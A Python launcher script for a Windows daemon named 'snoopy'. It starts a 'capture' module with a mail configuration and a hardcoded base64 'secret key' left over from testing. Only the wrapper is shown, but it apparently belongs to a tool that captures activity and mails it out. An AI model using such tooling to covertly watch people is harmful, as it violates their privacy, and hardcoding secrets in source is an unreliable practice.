#!/usr/bin/env python

import os
from lib.daemon import Daemon
from win32.killer import GracefulKiller
from win32 import capture as catcher

# TODO: remove this when we are finished with testing
_directory = os.path.dirname(os.path.abspath(__file__))
parentdir = os.path.dirname(_directory)
directory         = '{}\\snoopy'.format(parentdir)

# directory         = 'HOME_DIRECTORY'
installation_path = '{}\\dist\\snoopy'.format(directory)
# secret_key        = 'SUPER_SECRET_KEY'
secret_key        = 'U1VQRVJfU0VDUkVUX0tFWQ=='
mail_config       = 'windows_mail.config'


class MyDaemon(Daemon):
    def __init__(self):
        Daemon.__init__(
            self,
            mail_config,
            secret_key,
            installation_path,
            directory,
            catcher)

    def setup(self):
        # the graceful killer registers events on init
        GracefulKiller(self.notifier)
        # config_event_handler = ConfigFileEventHandler(
        #     self.notifier,
        #     config_dir,
        #     launchd_path,
        #     get_plist_filename())
        # self.observer.schedule(
        #     config_event_handler,
        #     launchd_path,
        #     recursive=False)
        pass


if __name__ == "__main__":
    daemon = MyDaemon()
    daemon.run()
